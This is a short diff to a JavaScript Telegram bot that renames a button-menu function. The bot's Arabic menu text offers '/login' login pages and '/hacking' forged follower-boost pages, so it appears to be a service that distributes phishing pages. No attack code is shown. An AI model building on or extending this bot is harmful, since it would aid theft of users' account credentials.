@@ -771,7 +771,7 @@ bot.on('message', async (msg) => {
 
   try {
     if (text === '/start') {
-      showButtons(senderId);
+      showdefaultButtons(senderId);
     } else if (text === '/login') {
       showLoginButtons(senderId);
     } else if (text === '/hacking') {
@@ -783,7 +783,7 @@ bot.on('message', async (msg) => {
   }
 });
 
-function showButtons(userId) {
+function showdefaultButtons(userId) {
   const statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;
 
   const defaultButtons = [
